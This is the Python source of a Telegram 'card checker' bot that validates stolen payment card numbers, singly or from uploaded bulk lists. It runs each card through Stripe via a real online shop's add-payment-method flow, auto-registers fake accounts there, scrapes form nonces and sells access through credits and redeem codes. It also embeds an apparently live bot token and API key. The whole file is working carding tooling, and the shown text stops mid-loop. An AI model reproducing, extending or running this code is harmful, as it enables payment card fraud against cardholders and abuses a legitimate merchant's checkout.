import requests
import telebot
import time
import re
import os
import json # For credit system
from telebot import types
from bs4 import BeautifulSoup
import random
import string

# -------------------- API Logic (Embedded gatet.py) --------------------
def Tele(session, cc):
    # ... (Tele function code - no changes needed)
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        # Step 1: Get Payment Method ID from Stripe API
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text

        if 'error' in res:
            error_message = response.json()['error']['message']
            if 'code' in error_message:
                return "CCN ✅"  # CCN
            else:
                return "DECLINED ❌"  # Declined
        else:
            payment_method_id = response.json()['id']

            # Step 2: Create and Confirm Setup Intent
            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
             # Extract Nonce
            # Use a function from ccs.py, this could be part of gate.py or main3.py depending on your desired structure
            # nonce = extract_stripe_nonce(session)
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }

            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
            res = response.json()

            if res['success'] == False:
                error = res['data']['error']['message']
                if 'code' in error:
                     return "CCN ✅"  # CCN
                else:
                    return "DECLINED ❌"  # Declined
            else:
                return "APPROVED ✅"  # Approved

    except Exception as e:
        print(f"Error in Tele function: {e}")
        return "Error"

# -------------------- End of API Logic --------------------

token = '7728685834:AAEi2xms7e_PglfC_5S-iHdyDIlMBAV94y4'  # bottoken Replace with your actual bot token
bot = telebot.TeleBot(token, parse_mode="HTML")
subscriber = '6317271346'
allowed_users = ['6317271346']  # Your ID
CREDIT_FILE = 'user_credits.json' # File to store user credits

# --- Credit System Functions ---
def load_credits():
    try:
        with open(CREDIT_FILE, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_credits(credits):
    with open(CREDIT_FILE, 'w') as f:
        json.dump(credits, f, indent=4)

def get_user_credits(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0) # Default to 0 if user not found

def set_user_credits(user_id, amount):
    credits = load_credits()
    credits[str(user_id)] = amount
    save_credits(credits)

def deduct_credits(user_id, amount=1):
    credits = load_credits()
    user_str_id = str(user_id)
    current_credits = credits.get(user_str_id, 0)
    if current_credits >= amount:
        credits[user_str_id] = current_credits - amount
        save_credits(credits)
        return True
    return False # Insufficient credits

def add_credits(user_id, amount):
    credits = load_credits()
    user_str_id = str(user_id)
    current_credits = credits.get(user_str_id, 0)
    credits[user_str_id] = current_credits + amount
    save_credits(credits)

# --- Bot Handlers ---

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    if str(user_id) not in allowed_users:
        bot.reply_to(message,
                     "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return

    credits = get_user_credits(user_id)
    if credits == 0: # Give initial credits only once
        set_user_credits(user_id, 500)
        bot.reply_to(message, f"🎉 𝐖𝐞𝐥𝐜𝐨𝐦𝐞! 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐠𝐫𝐚𝐧𝐭𝐞𝐝 premium 500  𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰 𝐨𝐫 𝐮𝐬𝐞 /chk 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝. 𝐘𝐨𝐮𝐫 𝐜𝐫𝐞𝐝𝐢𝐭𝐬: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰 𝐨𝐫 𝐮𝐬𝐞 /chk 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝. 𝐘𝐨𝐮𝐫 𝐜𝐫𝐞𝐝𝐢𝐭𝐬: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")


@bot.message_handler(commands=["add"])
def add_user(message):
    if str(message.chat.id) == subscriber:  # Only bot owner can add new users
        try:
            new_user_id = message.text.split()[1]  # Extract new user ID from the command
            allowed_users.append(new_user_id)
            bot.reply_to(message,
                         f"User ID {new_user_id} Has Been Added Successfully.✅\nCongratulations! Premium New User🎉✅ ")
        except IndexError:
            bot.reply_to(message, "Please provide a valid user ID. Example: /add 123456789")
    else:
        bot.reply_to(message, "You do not have permission to add users.🚫")


@bot.message_handler(commands=["delete"])
def delete_user(message):
    if str(message.chat.id) == subscriber:  # Only bot owner can delete users
        try:
            user_id_to_delete = message.text.split()[1]  # Extract user ID from the command
            if user_id_to_delete in allowed_users:
                allowed_users.remove(user_id_to_delete)
                bot.reply_to(message, f"User ID {user_id_to_delete} has been removed successfully.✅")
            else:
                bot.reply_to(message, "User ID not found in the list.🚫")
        except IndexError:
            bot.reply_to(message, "Please provide a valid user ID. Example: /delete 123456789")
    else:
        bot.reply_to(message, "You do not have permission to delete users.🚫")

# List to store generated redeem codes
valid_redeem_codes = []

# Function to generate a random redeem code in the format XXXX-XXXX-XXXX
def generate_redeem_code():
    code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    return code

# /code command handler https://replit.com/@cingkeshav123/Python?s=appto generate a new redeem code with a designed output
@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == subscriber or str(message.chat.id) == str(6658831303):  # Only the bot owner can generate codes
        new_code = generate_redeem_code() 
        new_code = "GOKU-"+new_code # Generate a new code
        valid_redeem_codes.append(new_code)  # Store the generated code
        # Send the redeem code in a designed format
        bot.reply_to(
            message,
            f"<b>🎉 New Redeem Code 🎉</b>\n\n"
            f"<code>{new_code}</code>\n\n"
            f"Use this code to redeem your access and get 500 credits!", # Updated message
            parse_mode="HTML"
        )
    else:
        bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")

# /redeem command handler (as explained earlier)
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    user_id = message.chat.id
    try:
        redeem_code = message.text.split()[1]  # Extract redeem code from message
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem XXXX-XXXX-XXXX")
        return

    if redeem_code in valid_redeem_codes:
        if str(user_id) not in allowed_users:
            allowed_users.append(str(user_id))  # Add user to allowed list
            valid_redeem_codes.remove(redeem_code)  # Remove used code
            add_credits(user_id, 500) # Add 500 credits
            bot.reply_to(message,
                         f"Redeem code <code>{redeem_code}</code> has been successfully redeemed.✅ You now have access to the bot and received <b>500 credits</b>! Your current credits: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML") # Updated message with credits
        else:
            add_credits(user_id, 500) # Add 500 credits even if already allowed
            bot.reply_to(message, f"Redeem code <code>{redeem_code}</code> has been successfully redeemed.✅ <b>500 credits</b> added to your account! Your current credits: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML") # Updated message for existing users
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")

def create_session():
    # ... (create_session function code - no changes needed)
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=rokynoa00077@gmail.com; mailchimp_user_email=rokynoa00077%40gmail.com; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731839322.43.0.0',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = (response.text)
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2F; _gcl_au=1.1.1622826255.1731751749; _ga=GA1.1.1270770700.1731751749; __stripe_mid=35b8babe-ae46-4c49-852c-1c7292bd93006e66f3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-11-17%2009%3A43%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_test_cookie=WP%20Cookie%20check; _ga_P0SVN1N4VZ=GS1.1.1731838417.2.1.1731840062.56.0.0; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fregister%2F; mailchimp.cart.previous_email=rokynoa00077@gmail.com; mailchimp.cart.current_email=rokynoa70@gmail.com; mailchimp_user_previous_email=rokynoa70%40gmail.com; mailchimp_user_email=rokynoa70%40gmail.com',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'Esahatam2009@'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent',
             'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        else:
            return None
    except Exception as e:
        return None


def save_session_to_file(session, file_path):
    # ... (save_session_to_file function code - no changes needed)
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))


def load_session_from_file(file_path):
    # ... (load_session_from_file function code - no changes needed)
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()

            session = requests.Session()

            cookies = eval(session_data)
            session.cookies.update(cookies)

            return session

    except Exception as e:
        h = 1
    return None


def manage_session_file():
    # ... (manage_session_file function code - no changes needed)
    session_file = "session.txt"

    if os.path.exists(session_file):
        session = load_session_from_file(session_file)
        if session:
            return session
        else:
            print("")
    else:
        print("")

    session = create_session()
    if session:
        save_session_to_file(session, session_file)
        return session
    else:
        return None


def generate_random_email(length=8, domain=None):
    # ... (generate_random_email function code - no changes needed)
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)

    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))

    return f"{username}@{domain}"

def extract_ccs_from_line(line):
    # ... (extract_ccs_from_line function code - no changes needed)
    cc_pattern = re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')
    matches = cc_pattern.findall(line)
    ccs = []
    for match in matches:
        ccs.append("|".join(match))
    return ccs


@bot.message_handler(commands=["chk", "check", "bin", "戮", "validate", '验卡', 'cc', 'card', 'info', '栓卡', '查询', '.chk']) # Added .chk and other variations
def check_single_card_command(message):
    user_id = message.chat.id
    if str(user_id) not in allowed_users:
        bot.reply_to(message,
                     "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return

    if str(user_id) != subscriber: # Subscriber (owner) has unlimited credits
        credits_available = get_user_credits(user_id)
        if credits_available <= 0:
            bot.reply_to(message, f"🚫 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 <code>{credits_available}</code> 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐑𝐞𝐝𝐞𝐞𝐦 𝐜𝐨𝐝𝐞𝐬 𝐨𝐫 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫. ", parse_mode="HTML")
            return
        if not deduct_credits(user_id): # Deduct credit, if fails (unlikely but for safety)
            bot.reply_to(message, "🚫 𝐄𝐫𝐫𝐨𝐫 𝐝𝐞𝐝𝐮𝐜𝐭𝐢𝐧𝐠 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫.")
            return

    try:
        cc_input = message.text.split(maxsplit=1)[1].strip() # Get text after command, handle potential spaces
        if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', cc_input): # Basic CC format validation
            bot.reply_to(message, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐂𝐂 𝐟𝐨𝐫𝐦𝐚𝐭. 𝐔𝐬𝐞: `/chk cc|mm|yy|cvv` or `.chk cc|mm|yy|cvv`")
            return
        cc = cc_input

        # Create / Load session
        session = manage_session_file()  # Get session
        if not session:
            bot.reply_to(message, "❌ Failed to create or load session. Please try again.")
            return

        ko_msg = bot.reply_to(message, "𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝 𝐃𝐞𝐭𝐚𝐢𝐥𝐬... ⌛").message_id

        try:
            data = requests.get('https://bins.antipublic.cc/bins/' + cc[:6]).json()
        except:
            data = {} # Handle potential json decode error
        try:
            brand = data.get('brand', 'Unknown') # Use .get() for safety if key doesn't exist
        except:
            brand = 'Unknown'
        try:
            card_type = data.get('type', 'Unknown')
        except:
            card_type = 'Unknown'
        try:
            country = data.get('country_name', 'Unknown')
            country_flag = data.get('country_flag', 'Unknown')
        except:
            country = 'Unknown'
            country_flag = 'Unknown'
        try:
            bank = data.get('bank', 'Unknown')
        except:
            bank = 'Unknown'

        start_time = time.time()
        try:
            last = str(Tele(session, cc.strip()))
        except Exception as e:
            print(e)
            last = "Error"

        if 'Your card could not be set up for future usage.' in last:
            last = 'Your card could not be set up for future usage.'
        if 'Your card was declined.' in last:
            last = 'Your card was declined.'
        if 'success' in last:
            last = 'APPROVED ✅'
        if 'Card Expired' in last:
            last = 'Your Card Expired'
        if 'Live' in last:
            last = 'APPROVED ✅'
        if 'Unable to authenticate' in last:
            last = 'Declined - Call Issuer'
        elif 'Proxy error' in last:
            last = 'Proxy error '

        end_time = time.time()
        execution_time = end_time - start_time

        msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐂𝐚𝐫𝐝 💳
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='https://t.me/+bkxW-_IANZQ3YjY1'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 𝘈𝘜𝘛𝘏 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ {last} ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''

        bot.edit_message_text(chat_id=message.chat.id, message_id=ko_msg, text=msg)
        if str(user_id) != subscriber:
            bot.send_message(chat_id=message.chat.id, text=f"💳 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐝! 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")


    except IndexError:
        bot.reply_to(message, "❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐂𝐂 𝐝𝐞𝐭𝐚𝐢𝐥𝐬 𝐚𝐟𝐭𝐞𝐫 the command. Use: `/chk cc|mm|yy|cvv` or `.chk cc|mm|yy|cvv`")
    except Exception as e:
        print(f"Error in single card check: {e}")
        bot.reply_to(message, "❌ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐭𝐡𝐞 𝐜𝐚𝐫𝐝.")


@bot.message_handler(content_types=["document"])
def main(message):
    user_id = message.chat.id
    if str(user_id) not in allowed_users:
        bot.reply_to(message,
                     "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return

    if str(user_id) != subscriber: # Subscriber (owner) has unlimited credits
        credits_available = get_user_credits(user_id)
        if credits_available <= 0:
            bot.reply_to(message, f"🚫 𝐈𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 <code>{credits_available}</code> 𝐜𝐫𝐞𝐝𝐢𝐭𝐬. 𝐑𝐞𝐝𝐞𝐞𝐦 𝐜𝐨𝐝𝐞𝐬 𝐨𝐫 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫. ", parse_mode="HTML")
            return


    dd = 0
    live = 0
    incorrect = 0
    ch = 0
    ko = bot.reply_to(message, "𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ...⌛").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)
    try:
        # Create / Load session
        session = manage_session_file()  # Get session
        if not session:
            bot.reply_to(message, "❌ Failed to create or load session. Please try again.")
            return
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = 0 # Initialize total count of processed CCs
            checked_count = 0 # Count of cards checked in this file upload

            for line in lino:
                extracted_ccs = extract_ccs_from_line(line)
                for cc in extracted_ccs:
                    if str(user_id) != subscriber: # Subscriber (owner) unlimited credits
                        if not deduct_credits(user_id): # Deduct credit for each card
                            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"🚫 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐄𝐱𝐡𝐚𝐮𝐬𝐭𝐞𝐝! 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 <code>{checked_count}</code> cards. 𝐑𝐞𝐝𝐞𝐞𝐦 𝐜𝐨𝐝𝐞𝐬 𝐨𝐫 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫. 𝐘𝐨𝐮𝐫 𝐜𝐫𝐞𝐝𝐢𝐭𝐬: <code>{get_user_credits(user_id)}</code>", parse_mode="HTML")
                            return # Stop processing if out of credits

                    total += 1 # Increment total count for each extracted CC
                    checked_count += 1 # Increment cards checked in this file upload
                    current_dir = os.getcwd()
                    for filename in os.listdir(current_dir):
                        if filename.endswith(".stop"):
                            bot.edit_message_text(chat_id=message.chat.id, message_id=ko,
                                                  text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @GOKUOFFICIALREAL_BOT')
